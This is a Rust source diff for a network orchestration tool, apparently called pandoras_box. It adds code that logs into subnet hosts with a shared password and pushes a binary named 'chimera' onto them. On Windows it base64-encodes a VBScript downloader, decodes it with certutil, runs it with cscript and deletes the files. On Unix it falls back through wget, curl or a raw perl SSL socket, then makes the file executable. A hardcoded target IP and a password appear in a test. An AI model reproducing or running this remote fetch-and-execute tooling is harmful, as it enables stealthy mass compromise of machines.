@@ -1,9 +1,12 @@
+use std::collections::HashMap;
+use std::net::IpAddr;
 use crate::communicator::{
-    unix_config, windows_config, Communicator, HostOperationResult, OSConfig,
+    unix_config, windows_config, Communicator, HostOperationResult, OSConfig, ClientWrapper,
 };
 use crate::enumerator::{Enumerator, Subnet};
 use crate::types::{Host, OS};
 use crate::{Error, Result};
+use base64::Engine;
 use rustrc::client::CommandOutput;
 use rustrc::cmd;
 use rustrc::ssh::SSHConfig;
@@ -18,10 +21,15 @@ use std::net::{SocketAddr, ToSocketAddrs};
 use std::sync::Arc;
 use std::time::Duration;
 
-use crate::logging::{log_failure, log_output, log_results, log_skipped, log_success};
+use crate::logging::{log_failure, log_output, log_results, log_skipped, log_success, log_host_results};
 
 static CHIMERA_UNIX: &[u8] = include_bytes!("../resources/chimera");
 static CHIMERA_WIN: &[u8] = include_bytes!("../resources/chimera.exe");
+//cmd.exe /c echo Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP.6.0"): xhr.Open "GET", "https://raw.githubusercontent.com/M00NLIG7/pandoras_box/master/pandoras_box/resources/chimera", False: xhr.Send: Set stream = CreateObject("ADODB.Stream"): stream.Open: stream.Type = 1: stream.Write xhr.responseBody: stream.SaveToFile "C:\Temp\chimera.exe", 2: stream.Close > dl.vbs && cscript //B dl.vbs
+
+static CHIMERA_URL_UNIX: &str = "https://raw.githubusercontent.com/M00NLIG7/pandoras_box/master/pandoras_box/resources/chimera";
+static CHIMERA_URL_WIN: &str = "https://raw.githubusercontent.com/M00NLIG7/pandoras_box/master/pandoras_box/resources/chimera.exe";
+static OUTPUT_PATH: &str = "/tmp/chimera";
 
 // Define a struct for mode configuration
 #[derive(Debug, Clone)]
@@ -76,6 +84,7 @@ impl NetworkManager {
     pub fn get_communicator(&self) -> Option<&Communicator> {
         self.communicator.as_ref()
     }
+
     async fn create_single_config(
         &self,
         host: &Arc<Host>,
@@ -224,16 +233,19 @@ impl NetworkManager {
         socket_addr: SocketAddr,
     ) -> Result<OSConfig> {
         if host.open_ports.contains(&22) {
+            info!("Attempting SSH connection for Windows host {}", host.ip);
             match self.try_windows_ssh(password, socket_addr).await {
-                Ok(config) => return Ok(config),
-                Err(e) => warn!(
-                    "SSH failed for Windows host {}: {}, trying WinExe",
-                    host.ip, e
-                ),
+                Ok(config) => Ok(config),
+                Err(e) => {
+                    warn!("SSH connection failed for {}: {}", host.ip, e);
+                    info!("Initiating WinExe fallback for {}", host.ip);
+                    self.try_windows_winexe(host, password).await
+                }
             }
+        } else {
+            info!("No SSH port available, using WinExe for {}", host.ip);
+            self.try_windows_winexe(host, password).await
         }
-
-        self.try_windows_winexe(host, password).await
     }
 
     async fn try_windows_ssh(&self, password: &str, socket_addr: SocketAddr) -> Result<OSConfig> {
@@ -275,6 +287,165 @@ impl Orchestrator {
         Self { network_manager }
     }
 
+    fn generate_base64_download_command(url: &str) -> String {
+        // Create the VBScript content
+        let vbs_script = format!(
+            "Dim xhr:Set xhr=CreateObject(\"MSXML2.XMLHTTP.6.0\"):xhr.Open \"GET\",\"{}\",False:xhr.Send:Set stream=CreateObject(\"ADODB.Stream\"):stream.Open:stream.Type=1:stream.Write xhr.responseBody:stream.SaveToFile \"C:\\Temp\\chimera.exe\",2:stream.Close",
+            url
+        );
+
+        // Base64 encode the VBScript
+        let encoded = base64::engine::general_purpose::STANDARD.encode(vbs_script);
+
+        // Generate the full command
+        format!(
+            "cmd.exe /c \"echo {} > encoded.b64 && certutil -decode encoded.b64 dl.vbs && cscript //B dl.vbs && del dl.vbs encoded.b64\"",
+            encoded
+        )
+    }
+
+    async fn check_tool_exists<'a>(client: &Arc<dyn ClientWrapper>, tool: &str) -> Result<CommandOutput> {
+        client.exec(&cmd!(format!("command -v {}", tool))).await
+    }
+
+    fn generate_perl_url_parts(url: &str) -> (String, String) {
+        let url_parts: Vec<&str> = url.split("://").nth(1).unwrap_or("").split('/').collect();
+        let host = url_parts[0].to_string();
+        let path = url_parts[1..].join("/");
+        (host, path)
+    }
+
+    fn generate_download_command(tool: &str, url: &str) -> String {
+        match tool {
+            "wget" => format!("wget -q {} -O {}", url, OUTPUT_PATH),
+            "curl" => format!("curl -s {} -o {}", url, OUTPUT_PATH),
+            "perl" => {
+                let (host, path) = Self::generate_perl_url_parts(url);
+                format!("perl -e 'use IO::Socket::SSL; $s=IO::Socket::SSL->new(PeerAddr=>\"{host}:443\") or die $!; print $s \"GET /{path} HTTP/1.0\\r\\nHost: {host}\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\"; while(<$s>){{last if /^\\r\\n$/}} while(read($s,$b,8192)){{print $b}}' > {output}", 
+                    host = host, 
+                    path = path,
+                    output = OUTPUT_PATH
+                )
+            },
+            _ => String::new()
+        }
+    }
+
+    async fn try_download_with_tool(
+        client: &Arc<dyn ClientWrapper>,
+        tool: &str,
+        ip: &IpAddr,
+        os: OS,
+    ) -> Option<HostOperationResult<CommandOutput>> {
+        match Self::check_tool_exists(client, tool).await {
+            Ok(output) => {
+                if !String::from_utf8_lossy(&output.stdout).trim().is_empty() {
+                    let cmd = Self::generate_download_command(tool, CHIMERA_URL_UNIX);
+                    let result = client.exec(&cmd!(cmd)).await;
+                    Some(HostOperationResult {
+                        ip: ip.to_string(),
+                        os,
+                        result,
+                    })
+                } else {
+                    None
+                }
+            }
+            Err(_) => None
+        }
+    }
+
+
+    async fn download_chimera(&self, communicator: &Communicator, host_map: HashMap<String, Arc<Host>>) -> Vec<(Arc<Host>, Result<()>)>{
+        let mut final_results = Vec::new();
+
+        let win_results = self.download_chimera_win(communicator, &host_map).await;
+        let unix_results = self.download_chimera_unix(communicator, &host_map).await;
+
+        final_results.extend(win_results);
+        final_results.extend(unix_results);
+
+        final_results
+    }
+
+    async fn download_chimera_win(&self, communicator: &Communicator, host_map: &HashMap<String, Arc<Host>>) -> Vec<(Arc<Host>, Result<()>)> {
+        let mut results = Vec::new();
+        let target_ip = "10.100.136.111";
+
+        // Create temp directory
+        let mkdir_cmd = "cmd.exe /c md C:\\Temp";
+        let mkdir_results = communicator.exec_by_os(&cmd!(mkdir_cmd), OS::Windows).await;
+        for result in &mkdir_results {
+            if result.ip == target_ip {
+                match &result.result {
+                    Ok(output) => {
+                        println!("Directory creation output for {}", target_ip);
+                        println!("Stdout: {}", String::from_utf8_lossy(&output.stdout));
+                        println!("Stderr: {}", String::from_utf8_lossy(&output.stderr));
+                    }
+                    Err(e) => println!("Directory creation error for {}: {}", target_ip, e),
+                }
+            }
+        }
+        results.extend(log_host_results(mkdir_results, &host_map, "directory creation"));
+
+        // Generate and execute the base64 download command
+        let download_cmd = Self::generate_base64_download_command(CHIMERA_URL_WIN);
+        let download_results = communicator.exec_by_os(&cmd!(download_cmd), OS::Windows).await;
+        for result in &download_results {
+            if result.ip == target_ip {
+                match &result.result {
+                    Ok(output) => {
+                        println!("Download command output for {}", target_ip);
+                        println!("Stdout: {}", String::from_utf8_lossy(&output.stdout));
+                        println!("Stderr: {}", String::from_utf8_lossy(&output.stderr));
+                    }
+                    Err(e) => println!("Download error for {}: {}", target_ip, e),
+                }
+            }
+        }
+        results.extend(log_host_results(download_results, &host_map, "chimera download"));
+
+        results
+    }
+
+    async fn download_chimera_unix(&self, communicator: &Communicator, host_map: &HashMap<String, Arc<Host>>) -> Vec<(Arc<Host>, Result<()>)> {
+        let unix_clients = communicator.get_clients_by_os(OS::Unix);
+
+        let mut final_results = Vec::new();
+
+        for (os, ip, client) in &unix_clients {
+            let tools = ["wget", "perl", "curl"];
+            let mut success = false;
+
+            for tool in tools {
+                if let Some(result) = Self::try_download_with_tool(client, tool, ip, *os).await {
+                    final_results.push(result);
+                    success = true;
+                    break;
+                }
+            }
+
+            if !success {
+                final_results.push(HostOperationResult {
+                    ip: ip.to_string(),
+                    os: *os,
+                    result: Err(Error::CommandError("No download tools available".into())),
+                });
+            }
+        }
+        
+
+        // Make successful downloads executable
+        for (_, ip, client) in unix_clients {
+            if final_results.iter().any(|r| r.ip == ip.to_string() && r.result.is_ok()) {
+                let _ = client.exec(&cmd!(format!("chmod +x {}", OUTPUT_PATH))).await;
+            }
+        }
+
+        log_host_results(final_results, &host_map, "chimera download")
+    }
+
     pub async fn run(&mut self, network_password: &str) -> Result<()> {
         info!("Starting Orchestrator run");
 
@@ -310,10 +481,18 @@ impl Orchestrator {
             }
         };
 
+
+        let host_map: std::collections::HashMap<String, Arc<Host>> = connected_hosts
+            .iter()
+            .map(|h| (h.ip.clone(), Arc::clone(h)))
+            .collect();
+
         if connected_hosts.is_empty() {
             error!("No hosts successfully connected");
             return Err(Error::CommandError("No hosts available".into()));
         }
+
+        /*
 
         // Step 3: Deploy Chimera to successfully connected hosts
         let deployment_results = self.deploy_chimera(&connected_hosts).await;
@@ -327,6 +506,44 @@ impl Orchestrator {
                 }
             })
             .collect();
+        */
+
+
+        let communicator = match self.network_manager.get_communicator() {
+            Some(comm) => comm,
+            None => return Err(Error::CommandError("Communicator not initialized".into())),
+        };
+
+        let deployment_results = self.download_chimera(&communicator, host_map).await;
+        let deployed_hosts: Vec<Arc<Host>> = deployment_results
+            .iter()
+            .filter_map(|(host, result)| match result {
+                Ok(_) => Some(host.clone()),
+                Err(e) => {
+                    error!("Failed to deploy to {}: {}", host.ip, e);
+                    None
+                }
+            })
+            .collect();
+
+        /*
+        let deployed_hosts: Vec<Arc<Host>> = deployment_results
+            .iter()
+            .filter_map(|result| {
+                match &result.result {
+                    Ok(_) => Some(Arc::new(Host {
+                        ip: result.ip.parse().unwrap(),
+                        os: result.os,
+                        open_ports: vec![22],
+                    })),
+                    Err(e) => {
+                        error!("Failed to deploy to {}: {}", result.ip, e);
+                        None
+                    }
+                }
+            })
+            .collect();
+        */
 
         if deployed_hosts.is_empty() {
             error!("No hosts successfully deployed");
@@ -715,4 +932,10 @@ async fn test_main() -> Result<()> {
     let mut orchestrator = Orchestrator::new(subnet);
 
     orchestrator.run("Cheesed2MeetU!").await
+}
+
+#[tokio::test]
+async fn test_win_cmdb64() -> Result<()> {
+    println!("{}", Orchestrator::generate_base64_download_command(CHIMERA_URL_WIN));
+    Ok(())
 }
